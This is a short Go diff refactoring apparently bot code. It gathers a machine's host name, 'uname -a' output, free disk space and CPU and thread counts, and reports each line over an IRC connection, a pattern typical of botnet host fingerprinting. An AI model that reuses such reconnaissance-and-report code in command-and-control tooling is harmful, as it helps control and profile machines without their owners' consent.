@@ -10,43 +10,28 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-type botsysteminfo struct {
-	sys, hn, fds string
-	ncpu         int
-}
-
 func freeDiskSpace(wd string) uint64 {
 	var stat unix.Statfs_t
 	unix.Statfs(wd, &stat)
 	return stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024
 }
 
-func (irc *IRC) sysInfo() string {
-	cmd, err := exec.Command("uname", "-a").Output()
-	if err != nil {
-		irc.IRC_Report("Get system infomation is failed...")
-	}
-	return string(cmd)
+func (info INFO) threadsNumber() string {
+	return strconv.Itoa(info.ncpu * 2)
 }
 
-func (inf botsysteminfo) threadsNumber() string {
-	return strconv.Itoa(inf.ncpu * 2)
-}
-
-func (irc *IRC) ReportInf() {
+func (irc *IRC) ReportInfo() {
 	hName, _ := os.Hostname()
 	wd, _ := os.Getwd()
+	uname, _ := exec.Command("uname", "-a").Output()
 
-	_botsysteminfo := botsysteminfo{
-		sys:  irc.sysInfo(),
-		hn:   hName,
-		fds:  fmt.Sprint(freeDiskSpace(wd)),
+	info := &INFO{
 		ncpu: runtime.NumCPU(),
 	}
 
-	irc.IRC_Report("System: " + _botsysteminfo.sys)
-	irc.IRC_Report("Host Name: " + _botsysteminfo.hn)
-	irc.IRC_Report("Free Disk Space (GB): " + _botsysteminfo.fds)
-	irc.IRC_Report("Number of CPUs: " + strconv.Itoa(_botsysteminfo.ncpu))
-	irc.IRC_Report("Number of Threads: " + _botsysteminfo.threadsNumber())
+	irc.IRCreport("Host Name: " + hName)
+	irc.IRCreport("System: " + string(uname))
+	irc.IRCreport("Free Disk Space (GB): " + fmt.Sprint(freeDiskSpace(wd)))
+	irc.IRCreport("Number of CPUs: " + strconv.Itoa(info.ncpu))
+	irc.IRCreport("Number of Threads: " + info.threadsNumber())
 }
